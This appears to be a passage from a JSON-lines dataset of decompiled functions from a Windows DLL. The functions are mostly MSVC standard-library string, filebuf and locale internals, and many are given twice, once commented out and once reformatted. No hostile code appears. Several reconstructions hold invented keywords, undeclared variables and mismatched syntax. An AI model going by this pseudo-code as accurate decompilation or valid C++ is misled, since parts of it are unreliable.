*puVar3 = *(undefined8 **)this;\n            FUN_10018670(puVar6, puVar3, uVar1);\n            FUN_10005040(puVar3, uVar2 + 1);\n        }\n        \n        *(undefined *)((int)puVar6 + uVar1) = param_3;\n        *(undefined *)((int)puVar6 + uVar1 + 1) = 0;\n        *(undefined8 **)this = puVar6;\n        return this;\n    }\n    \n    FUN_10005260();\n    code *pcVar4 = (code *)swi(3);\n    return (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)(*pcVar4)();\n}"}
{"Function Name": "std::use_facet<class_std::codecvt<char,char,struct__Mbstatet>_>", "Address": "10015628", "Source Code": "\\*\ncodecvt<char,char,struct__Mbstatet> * __cdecl\nstd::use_facet<class_std::codecvt<char,char,struct__Mbstatet>_>(locale *param_1)\n{\n    code *pcVar1; \n    int *piVar2 = DAT_1004fb24; \n    uint uVar3; \n    int iVar4; \n    codecvt<char,char,struct__Mbstatet> *pcVar5; \n    int local_24[3]; \n    int local_18; \n    _Lockit::_Lockit((_Lockit *)&local_18, 0); \n    uVar3 = FUN_10001940((int *)&DAT_1004fb18); \n    iVar4 = FUN_10001a40(param_1, uVar3); \n    \n    if ((iVar4 == 0) && (piVar2 == (int *)0x0)) { \n        uVar3 = codecvt<char,char,struct__Mbstatet>::_Getcat((facet **) &piVar2, param_1); \n        \n        if (uVar3 == 0xffffffff) { \n            FUN_10001720(local_24); \n            __CxxThrowException_8(local_24, &DAT_1004c5dc); \n            pcVar1 = (code *)swi(3); \n            pcVar5 = (codecvt<char,char,struct__Mbstatet> *)(*pcVar1)(); \n            return pcVar5; \n        }\n        \n        _Facet_Register((_Facet_base *)piVar2); \n        pcVar1 = *(code **)(*piVar2 + 4); \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*pcVar1)(); \n        DAT_1004fb24 = piVar2; \n    }\n    \n    FUN_10014d7c(&local_18); \n    pcVar5 = (codecvt<char,char,struct__Mbstatet> *)FUN_10036ff7(); \n    return pcVar5; \n}\n*\\ \n \ncodecvt<char,char,struct__Mbstatet> * __cdecl\nstd::use_facet<class_std::codecvt<char,char,struct__Mbstatet>_>(locale *param_1)\n{\n    code *pcVar1;\n    int *piVar2 = DAT_1004fb24;\n    uint uVar3;\n    int iVar4;\n    codecvt<char,char,struct__Mbstatet> *pcVar5;\n    int local_24[3];\n    int local_18;\n    _Lockit::_Lockit((_Lockit *)&local_18, 0);\n    uVar3 = FUN_10001940((int *)&DAT_1004fb18);\n    iVar4 = FUN_10001a40(param_1, uVar3);\n    \n    if ((iVar4 == 0) && (piVar2 == (int *)0x0)) {\n        uVar3 = codecvt<char,char,struct__Mbstatet>::_Getcat((facet **) &piVar2, param_1);\n        \n        if (uVar3 == 0xffffffff) {\n            FUN_10001720(local_24);\n            __CxxThrowException_8(local_24, &DAT_1004c5dc);\n            pcVar1 = (code *)swi(3);\n            pcVar5 = (codecvt<char,char,struct__Mbstatet> *)(*pcVar1)();\n            return pcVar5;\n        }\n        \n        _Facet_Register((_Facet_base *)piVar2);\n        pcVar1 = *(code **)(*piVar2 + 4);\n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        (*pcVar1)();\n        DAT_1004fb24 = piVar2;\n    }\n    \n    FUN_10014d7c(&local_18);\n    pcVar5 = (codecvt<char,char,struct__Mbstatet> *)FUN_10036ff7();\n    return pcVar5;\n}"}
{"Function Name": "FUN_10015735", "Address": "10015735", "Source Code": "void __fastcall FUN_10015735(undefined4 *stream_buffer)\n{\n    int function_result; \n    _Locimp *locale_pointer; \n    \n    \n    *stream_buffer = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;\n    \n    \n    function_result = FUN_10013cf9(8);\n    \n    \n    if (function_result != 0) {\n        \n        locale_pointer = std::locale::_Init(true);\n        \n        *(_Locimp **)(function_result + 4) = locale_pointer;\n    }\n    \n    \n    stream_buffer[0xd] = function_result;\n    \n    \n    std::basic_streambuf<char,struct_std::char_traits<char>_>::_Init((basic_streambuf<char,struct_std::char_traits<char>_> *)stream_buffer);\n    \n    \n    FUN_10036ff7();\n}"}
{"Function Name": "std::fpos<struct__Mbstatet>::fpos<struct__Mbstatet>", "Address": "1001577c", "Source Code": "\\*\nfpos<struct__Mbstatet> * __thiscall\nstd::fpos<struct__Mbstatet>::fpos<struct__Mbstatet>\n(fpos<struct__Mbstatet> *this, undefined4 param_1, undefined4 param_2, undefined4 param_3,\nundefined4 param_4)\n{\n    \n    *(undefined4 *)this = param_3;\n    \n    \n    *(undefined4 *)(this + 4) = param_4;\n    \n    \n    *(undefined4 *)(this + 0x10) = param_1;\n    \n    \n    *(undefined4 *)(this + 0x14) = param_2;\n    \n    \n    return this;\n}\n*\\ \n \nfpos<struct__Mbstatet> * __thiscall\nstd::fpos<struct__Mbstatet>::fpos<struct__Mbstatet>\n(fpos<struct__Mbstatet> *this, undefined4 param_1, undefined4 param_2, undefined4 param_3,\nundefined4 param_4)\n{\n    *(undefined4 *)this = param_3;\n    *(undefined4 *)(this + 4) = param_4;\n    *(undefined4 *)(this + 0x10) = param_1;\n    *(undefined4 *)(this + 0x14) = param_2;\n    return this;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::~basic_filebuf<char,struct_std::char_traits<char>_>", "Address": "100157fd", "Source Code": "\\*\nvoid __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::\n~basic_filebuf<char,struct_std::char_traits<char>_>\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    \n    ExceptionList = &ExceptionList;\n    \n    *(undefined ***)this = vftable;\n    \n    if (*(int *)(this + 0x4c) != 0) {\n        \n        _Reset_back(this);\n    }\n    \n    if (this[0x48] != (basic_filebuf<char,struct_std::char_traits<char>_>)0x0) {\n        \n        close(this);\n    }\n    \n    ~basic_streambuf<>((undefined4 *)this);\n    \n    \n    return;\n}\n*\\ \n \nvoid __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::\n~basic_filebuf<char,struct_std::char_traits<char>_>\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\nExceptionList = &ExceptionList;\n*(undefined ***)this = vftable;\nif (*(int *)(this + 0x4c) != 0) {\n    _Reset_back(this);\n}\nif (this[0x48] != (basic_filebuf<char,struct_std::char_traits<char>_>)0x0) {\n    close(this);\n}\n~basic_streambuf<>((undefined4 *)this);\nreturn;\n}"}
{"Function Name": "~basic_streambuf<>", "Address": "10015895", "Source Code": "\\*\nvoid __fastcall ~basic_streambuf<>(undefined4 *streambuf_ptr) \n{\n    void *buffer_ptr = (void *)streambuf_ptr[0xd]; \n    *streambuf_ptr = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable; \n    if (buffer_ptr != (void *)0x0) { \n        FUN_100019d0((int)buffer_ptr); \n        FUN_10013ceb(buffer_ptr); \n    }\n}\n*\\ \n \nvoid __fastcall ~basic_streambuf<>(undefined4 *streambuf_ptr)\n{\n    void *buffer_ptr = (void *)streambuf_ptr[0xd];\n    *streambuf_ptr = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;\n    if (buffer_ptr != (void *)0x0) {\n        FUN_100019d0((int)buffer_ptr);\n        FUN_10013ceb(buffer_ptr);\n    }\n}"}
{"Function Name": "FUN_10015914", "Address": "10015914", "Source Code": "void __thiscall FUN_10015914(void *object_pointer, byte destructor_param)\n{\n    \n    \n    \n    FID_conflict__scalar_deleting_destructor_((void *)((int)object_pointer - *(int *)((int)object_pointer - 4)), destructor_param);\n}"}
{"Function Name": "FUN_100159dd", "Address": "100159dd", "Source Code": "\\*\nundefined4 * method FUN_100159dd(void *object, byte flag)\n{\n    \n    *(undefined ***)object = std::_Facet_base::vftable;\n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * method FUN_100159dd(void *object, byte flag)\n{\n    *(undefined ***)object = std::_Facet_base::vftable;\n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "std::ios_base::`scalar_deleting_destructor'", "Address": "10015a00", "Source Code": "void * __thiscall std::ios_base::_scalar_deleting_destructor_(ios_base *iosBase, uint flags)\n{\n    undefined *stackPointer; \n    stackPointer = &LAB_10038fa4; \n    exceptionList = &exceptionList; \n    *(undefined ***)iosBase = virtualFunctionTable; \n    _Ios_base_dtor(iosBase); \n    if ((flags & 1) != 0) { \n        FUN_10013ceb(iosBase); \n    }\n    return iosBase; \n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::_Endwrite", "Address": "10015a58", "Source Code": "bool __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::_Endwrite\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    code *pcVar1; \n    int iVar3; \n    size_t _Count; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if ((*(int *)(this + 0x38) != 0) && (this[0x3d] != (basic_filebuf<char,struct_std::char_traits<char>_>)0x0)) {\n        \n        pcVar1 = *(code **)(*(int *)this + 0xc);\n        \n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(0xffffffff);\n        \n        \n        iVar3 = (*pcVar1)();\n        \n        \n        if (iVar3 != -1) {\n            \n            pcVar1 = *(code **)(**(int **)(this + 0x38) + 0x20);\n            \n            \n            (*(code *)PTR__guard_check_icall_1003a2f8)(this + 0x40, local_28, &local_8, &local_2c);\n            \n            \n            iVar3 = (*pcVar1)();\n            \n            \n            if (iVar3 == 0) {\n                \n                this[0x3d] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x0;\n            } else if (iVar3 != 1) goto LAB_10015afa; \n            \n            \n            _Count = local_2c - (int)local_28;\n            \n            \n            if (_Count != 0) {\n                _fwrite(local_28, 1, _Count, *(FILE **)(this + 0x4c));\n            }\n        }\n    }\nLAB_10015afa:\n    \n    return (bool)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "std::codecvt<char,char,struct__Mbstatet>::_Getcat", "Address": "10015b08", "Source Code": "uint __cdecl std::codecvt<char,char,struct__Mbstatet>::_Getcat(facet **facet_pointer, locale *locale_pointer)\n{\n    undefined4 *undefined_pointer; \n    char *char_pointer;       \n    uint return_value;        \n    int local_array[13];  \n    \n    if ((facet_pointer != (facet **)0x0) && (*facet_pointer == (facet *)0x0)) {\n        undefined_pointer = (undefined4 *)FUN_10013cf9(8); \n        if (undefined_pointer == (undefined4 *)0x0) { \n            undefined_pointer = (undefined4 *)0x0; \n        } else {\n            char_pointer = FUN_10001a20((int)locale_pointer); \n            FUN_10001740(local_array, char_pointer); \n            *undefined_pointer = vftable; \n            undefined_pointer[1] = 0; \n        }\n        *facet_pointer = (facet *)undefined_pointer; \n        if (undefined_pointer != (undefined4 *)0x0) { \n            FUN_10001800(local_array); \n        }\n    }\n    return_value = FUN_10036ff7(); \n    return return_value; \n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::_Init", "Address": "10015b70", "Source Code": "void __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::_Init\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,_iobuf *param_1,_Initfl param_2)\n{\n    \n    this[0x48] = (basic_filebuf<char,struct_std::char_traits<char>_>)(param_2 == 1);\n    \n    \n    this[0x3d] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x0;\n    \n    \n    basic_streambuf<char,struct_std::char_traits<char>_>::_Init\n    ((basic_streambuf<char,struct_std::char_traits<char>_> *)this);\n    \n    \n    if (param_1 != (_iobuf *)0x0) {\n        \n        int local_8 = 0, local_c = 0, local_10 = 0;\n        \n        \n        __get_stream_buffer_pointers((int)param_1,&local_8,&local_c,&local_10);\n        \n        \n        *(int *)(this + 0xc) = local_8;\n        *(int *)(this + 0x10) = local_8;\n        *(int *)(this + 0x1c) = local_c;\n        *(int *)(this + 0x20) = local_c;\n        *(int *)(this + 0x2c) = local_10;\n        *(int *)(this + 0x30) = local_10;\n    }\n    \n    \n    *(_iobuf **)(this + 0x4c) = param_1;\n    \n    \n    *(undefined4 *)(this + 0x40) = DAT_1004fb1c; \n    *(undefined4 *)(this + 0x38) = 0;            \n    *(undefined4 *)(this + 0x44) = DAT_1004fb20; \n    \n    return; \n}"}
{"Function Name": "std::basic_streambuf<char,struct_std::char_traits<char>_>::_Init", "Address": "10015bec", "Source Code": "void __thiscall\nstd::basic_streambuf<char,struct_std::char_traits<char>_>::_Init\n(basic_streambuf<char,struct_std::char_traits<char>_> *this)\n{\n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0xc) = this + 4;\n    \n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0x10) = this + 8;\n    \n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0x1c) = this + 0x14;\n    \n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0x20) = this + 0x18;\n    \n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0x2c) = this + 0x24;\n    \n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0x30) = this + 0x28;\n    \n    \n    *(undefined4 *)(this + 8) = 0;\n    \n    \n    **(undefined4 **)(this + 0xc) = 0;\n    \n    \n    **(undefined4 **)(this + 0x10) = 0;\n    \n    \n    **(undefined4 **)(this + 0x1c) = 0;\n    \n    \n    **(undefined4 **)(this + 0x2c) = 0;\n    \n    \n    **(undefined4 **)(this + 0x30) = 0;\n    \n    \n    return;\n}"}
{"Function Name": "std::ios_base::_Init", "Address": "10015c30", "Source Code": "void __thiscall std::ios_base::_Init(ios_base *iosBase)\n{\n    _Locimp *localeImpl; \n    *(undefined4 *)(iosBase + 0x14) = 0x201; \n    *(undefined4 *)(iosBase + 0x30) = 0; \n    *(undefined4 *)(iosBase + 8) = 0; \n    *(undefined4 *)(iosBase + 0x10) = 0; \n    *(undefined4 *)(iosBase + 0x18) = 6; \n    *(undefined4 *)(iosBase + 0x1c) = 0; \n    *(undefined4 *)(iosBase + 0x20) = 0; \n    *(undefined4 *)(iosBase + 0x24) = 0; \n    *(undefined4 *)(iosBase + 0x28) = 0; \n    *(undefined4 *)(iosBase + 0x2c) = 0; \n    FUN_10002180(iosBase, 0, '\\0'); \n    int resourceId = FUN_10013cf9(8); \n    if (resourceId != 0) { \n        localeImpl = locale::_Init(true); \n        *(_Locimp **)(resourceId + 4) = localeImpl; \n    }\n    \n    *(int *)(iosBase + 0x30) = resourceId; \n    FUN_10036ff7(); \n    return; \n}"}
{"Function Name": "FUN_10015cc1", "Address": "10015cc1", "Source Code": "void __fastcall FUN_10015cc1(int file_pointer)\n{\n    \n    if (*(int *)(file_pointer + 0x4c) != 0) {\n        \n        lock_file_function(*(FILE **)(file_pointer + 0x4c));\n    }\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::_Reset_back", "Address": "10015cd1", "Source Code": "void __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::_Reset_back\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    \n    if (**(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0xc) == this + 0x3c) {\n        \n        basic_filebuf<char,struct_std::char_traits<char>_> *pbVar1 = *(basic_filebuf<char,struct_std::char_traits<char>_> **)(this + 0x50);\n        \n        \n        **(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0xc) = pbVar1;\n        \n        \n        **(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0x1c) = pbVar1;\n        \n        \n        **(int **)(this + 0x2c) = *(int *)(this + 0x54) - (int)pbVar1;\n    }\n    \n    return;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::_Set_back", "Address": "10015cf4", "Source Code": "void __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::_Set_back\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    \n    basic_filebuf<char,struct_std::char_traits<char>_> *pbVar1 = this + 0x3c;\n    \n    \n    basic_filebuf<char,struct_std::char_traits<char>_> *pbVar2 = **(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0xc);\n    \n    \n    if (pbVar2 != pbVar1) {\n        \n        *(basic_filebuf<char,struct_std::char_traits<char>_> **)(this + 0x50) = pbVar2;\n        \n        \n        *(int *)(this + 0x54) = **(int **)(this + 0x2c) + **(int **)(this + 0x1c);\n    }\n    \n    \n    **(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0xc) = pbVar1;\n    \n    \n    **(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0x1c) = pbVar1;\n    \n    \n    **(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0x2c) = this + (0x3d - (int)pbVar1);\n}"}
{"Function Name": "FUN_10015d2a", "Address": "10015d2a", "Source Code": "void __fastcall FUN_10015d2a(int file_descriptor)\n{\n    \n    FILE *file_pointer = *(FILE **)(file_descriptor + 0x4c);\n    \n    \n    if (file_pointer != 0) {\n        \n        __unlock_file(file_pointer);\n    }\n}"}
{"Function Name": "std::codecvt_base::always_noconv", "Address": "10015d3a", "Source Code": "bool this_call std::codecvtBase::alwaysNoConv(codecvt_base *self)\n{\n    \n    \n    return (bool)(*(code **)(*(int *)self + 0xc))();\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::close", "Address": "10015d52", "Source Code": "\\*\nbasic_filebuf<char,struct_std::char_traits<char>_> * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::close\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    bool bVar2; \n    int iVar3;  \n    basic_filebuf<char,struct_std::char_traits<char>_> *pbVar4; \n    \n    if (*(int *)(this + 0x4c) == 0) {\n        return (basic_filebuf<char,struct_std::char_traits<char>_> *)0x0; \n    }\n    \n    bVar2 = _Endwrite(this);\n    \n    iVar3 = _fclose(*(FILE **)(this + 0x4c));\n    \n    pbVar4 = (basic_filebuf<char,struct_std::char_traits<char>_> *)\n        (~-(uint)(iVar3 != 0) & -(uint)bVar2 & (uint)this);\n    \n    this[0x48] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x0; \n    this[0x3d] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x0; \n    \n    basic_streambuf<char,struct_std::char_traits<char>_>::_Init\n        ((basic_streambuf<char,struct_std::char_traits<char>_> *)this);\n    \n    *(undefined4 *)(this + 0x4c) = 0;\n    \n    *(undefined4 *)(this + 0x40) = DAT_1004fb1c;\n    \n    *(undefined4 *)(this + 0x38) = 0;\n    \n    *(undefined4 *)(this + 0x44) = DAT_1004fb20;\n    \n    return pbVar4;\n}\n*\\ \n \nbasic_filebuf<char,struct_std::char_traits<char>_> * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::close\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    bool bVar2;\n    int iVar3;\n    basic_filebuf<char,struct_std::char_traits<char>_> *pbVar4;\n    if (*(int *)(this + 0x4c) == 0) {\n        return (basic_filebuf<char,struct_std::char_traits<char>_> *)0x0;\n    }\n    bVar2 = _Endwrite(this);\n    iVar3 = _fclose(*(FILE **)(this + 0x4c));\n    pbVar4 = (basic_filebuf<char,struct_std::char_traits<char>_> *)\n        (~-(uint)(iVar3 != 0) & -(uint)bVar2 & (uint)this);\n    this[0x48] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x0;\n    this[0x3d] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x0;\n    basic_streambuf<char,struct_std::char_traits<char>_>::_Init\n        ((basic_streambuf<char,struct_std::char_traits<char>_> *)this);\n    *(undefined4 *)(this + 0x4c) = 0;\n    *(undefined4 *)(this + 0x40) = DAT_1004fb1c;\n    *(undefined4 *)(this + 0x38) = 0;\n    *(undefined4 *)(this + 0x44) = DAT_1004fb20;\n    return pbVar4;\n}"}
{"Function Name": "std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase", "Address": "10015df4", "Source Code": "\\*\nbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall\nstd::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase\n(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this,\nuint param_1,uint param_2)\n{\n    \n    uint uVar1 = *(uint *)(this + 0x10);\n    \n    \n    if (param_1 <= uVar1) {\n        \n        uint uVar4 = uVar1 - param_1;\n        \n        \n        if (param_2 <= uVar4) {\n            uVar4 = param_2;\n        }\n        \n        \n        *(uint *)(this + 0x10) = uVar1 - uVar4;\n        \n        \n        FUN_10018bf0((undefined8 *)(this + param_1), (undefined8 *)(uVar4 + (int)(this + param_1)), ((uVar1 - uVar4) - param_1) + 1);\n        \n        \n        return this;\n    }\n    \n    \n    FUN_100043a0();\n    \n    \n    return (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)(*(code **)swi(3))();\n}\n*\\ \n \nbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall\nstd::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase\n(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this,\nuint param_1,uint param_2)\n{\n    uint uVar1 = *(uint *)(this + 0x10);\n    if (param_1 <= uVar1) {\n        uint uVar4 = uVar1 - param_1;\n        if (param_2 <= uVar4) {\n            uVar4 = param_2;\n        }\n        *(uint *)(this + 0x10) = uVar1 - uVar4;\n        FUN_10018bf0((undefined8 *)(this + param_1), (undefined8 *)(uVar4 + (int)(this + param_1)), ((uVar1 - uVar4) - param_1) + 1);\n        return this;\n    }\n    FUN_100043a0();\n    return (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)(*(code **)swi(3))();\n}"}
{"Function Name": "std::basic_ios<char,struct_std::char_traits<char>_>::init", "Address": "10015e5b", "Source Code": "void __thiscall\nstd::basic_ios<char,struct_std::char_traits<char>_>::init\n(basic_ios<char,struct_std::char_traits<char>_> *this,\nbasic_streambuf<char,struct_std::char_traits<char>_> *param_1,bool param_2)\n{\n    \n    ios_base::_Init((ios_base *)this);\n    \n    \n    *(basic_streambuf<char,struct_std::char_traits<char>_> **)(this + 0x38) = param_1;\n    \n    \n    this[0x40] = (basic_ios<char,struct_std::char_traits<char>_>)FUN_10005430(this,0x20);\n    \n    \n    if (*(int *)(this + 0x38) == 0) {\n        FUN_10002180(this,*(uint *)(this + 0xc) | 4,'\\0');\n    }\n    \n    \n    if (param_2) {\n        ios_base::_Addstd((ios_base *)this);\n    }\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::overflow", "Address": "10015ea4", "Source Code": "int __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::overflow\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,int param_1)\n{\n    size_t sVar3; \n    int iVar4; \n    size_t _Count; \n    uint uVar5; \n    _iobuf *p_Var6; \n    uint local_8; \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    if (param_1 != -1) { \n        uVar5 = **(uint **)(this + 0x20); \n        if (uVar5 != 0) { \n            iVar4 = **(int **)(this + 0x30); \n            if (uVar5 < iVar4 + uVar5) { \n                **(int **)(this + 0x30) = iVar4 - 1; \n                *(char **)(this + 0x20)[0] = (char)param_1; \n                goto LAB_10015f9c; \n            }\n        }\n        if (*(int *)(this + 0x4c) != 0) { \n            _Reset_back(this); \n            int *local_30 = *(int **)(this + 0x38); \n            if (local_30 == (int *)0x0) { \n                p_Var6 = *(_iobuf **)(this + 0x4c); \n                uVar5 = param_1 & 0xff; \n            } else {\n                undefined4 local_2c = CONCAT31(local_2c._1_3_, (char)param_1); \n                code *pcVar2 = *(code **)(*local_30 + 0x1c); \n                \n                (*(code *)PTR__guard_check_icall_1003a2f8)(this + 0x40, &local_2c, (int)&local_2c + 1, &local_38, local_28, &local_8, &local_34);\n                iVar4 = (*pcVar2)(); \n                if (iVar4 < 0) goto LAB_10015f9c; \n                if (iVar4 < 2) { \n                    _Count = local_34 - (int)local_28; \n                    \n                    if ((_Count == 0) || (sVar3 = _fwrite(local_28, 1, _Count, *(FILE **)(this + 0x4c)), _Count == sVar3)) {\n                        this[0x3d] = (basic_filebuf<char,struct_std::char_traits<char>_>)0x1; \n                    }\n                    goto LAB_10015f9c; \n                }\n                if (iVar4 != 3) goto LAB_10015f9c; \n                p_Var6 = *(_iobuf **)(this + 0x4c); \n                uVar5 = local_2c; \n            }\n            _Fputc<char>((char)uVar5, p_Var6); \n        }\n    }\nLAB_10015f9c:\n    return ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::pbackfail", "Address": "10015fb2", "Source Code": "int __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::pbackfail\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,int param_1)\n{\n    \n    uint uVar1 = **(uint **)(this + 0x1c);\n    \n    \n    \n    if (uVar1 != 0 && **(uint **)(this + 0xc) < uVar1 &&\n        (param_1 == -1 || *(byte *)(uVar1 - 1) == param_1)) {\n        \n        \n        **(int **)(this + 0x2c) += 1;\n        \n        \n        **(int **)(this + 0x1c) -= 1;\n        \n        \n        return -(uint)(param_1 != -1) & param_1;\n    }\n    \n    \n    if (*(int *)(this + 0x4c) != 0 && param_1 != -1) {\n        \n        \n        if (*(int *)(this + 0x38) == 0 && _ungetc(param_1 & 0xff, *(FILE **)(this + 0x4c)) != -1) {\n            return param_1; \n        }\n        \n        \n        if (**(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0x1c) != this + 0x3c) {\n            this[0x3c] = SUB41(param_1, 0); \n            _Set_back(this); \n            return param_1; \n        }\n    }\n    \n    \n    return -1;\n}"}
{"Function Name": "std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::push_back", "Address": "10016034", "Source Code": "\\*\nvoid __thiscall\nstd::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::push_back\n(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this,\nchar param_1)\n{\n    uint uVar1; \n    uVar1 = *(uint *)(this + 0x10); \n    \n    if (uVar1 < *(uint *)(this + 0x14)) {\n        *(uint *)(this + 0x10) = uVar1 + 1; \n        \n        if (0xf < *(uint *)(this + 0x14)) {\n            this = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char> **)this; \n        }\n        \n        this[uVar1] = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_)param_1;\n        this[uVar1 + 1] = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_)0x0; \n    }\n    else {\n        \n        _Reallocate_grow_by<class_<lambda_15711c68e099a15a58f4d77303cb286d>,char>(this, 1, (uint)this & 0xffffff00, param_1);\n    }\n    return; \n}\n*\\ \n \nvoid __thiscall\nstd::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::push_back\n(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this,\nchar param_1)\n{\nuint uVar1;\nuVar1 = *(uint *)(this + 0x10);\nif (uVar1 < *(uint *)(this + 0x14)) {\n    *(uint *)(this + 0x10) = uVar1 + 1;\n    if (0xf < *(uint *)(this + 0x14)) {\n        this = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)this;\n    }\n    this[uVar1] = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>)param_1;\n    this[uVar1 + 1] = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_)0x0;\n}\nelse {\n    _Reallocate_grow_by<class_<lambda_15711c68e099a15a58f4d77303cb286d>,char>(this, 1, (uint)this & 0xffffff00, param_1);\n}\nreturn;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::seekoff", "Address": "10016070", "Source Code": "\\*\nundefined4 * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::seekoff\n(basic_filebuf<char,struct_std::char_traits<char>_> *this, undefined4 *param_1,\nuint param_3_00, uint param_3, int param_4)\n{\n    int iVar1; \n    bool bVar2; \n    \n    if (((**(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0x1c) == this + 0x3c) &&\n        (param_4 == 1)) && (*(int *)(this + 0x38) == 0)) {\n        \n        bVar2 = param_3_00 != 0; \n        param_3_00 = param_3_00 - 1; \n        param_3 = (param_3 - 1) + (uint)bVar2; \n    }\n    \n    if (((*(int *)(this + 0x4c) == 0) || (bVar2 = _Endwrite(this), !bVar2)) ||\n        ((((param_3_00 | param_3) != 0 || (param_4 != 1)) &&\n        (iVar1 = __fseeki64(*(FILE **)(this + 0x4c), CONCAT44(param_4, param_3), 0), iVar1 != 0)\n        ))) || (iVar1 = _fgetpos(*(FILE **)(this + 0x4c), (fpos_t *)&this), iVar1 != 0)) {\n        \n        \n        *param_1 = 0xffffffff; \n        param_1[1] = 0xffffffff; \n        param_1[2] = 0; \n        param_1[3] = 0; \n        param_1[4] = 0; \n        param_1[5] = 0; \n    }\n    else {\n        \n        _Reset_back(this); \n        fpos<struct__Mbstatet>::fpos<struct__Mbstatet>\n        ((fpos<struct__Mbstatet> *)param_1, *(undefined4 *)(this + 0x40),\n        *(undefined4 *)(this + 0x44), this, this); \n    }\n    return param_1; \n}\n*\\ \n \nundefined4 * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::seekoff\n(basic_filebuf<char,struct_std::char_traits<char>_> *this, undefined4 *param_1,\nuint param_3_00, uint param_3, int param_4)\n{\nint iVar1;\nbool bVar2;\nif 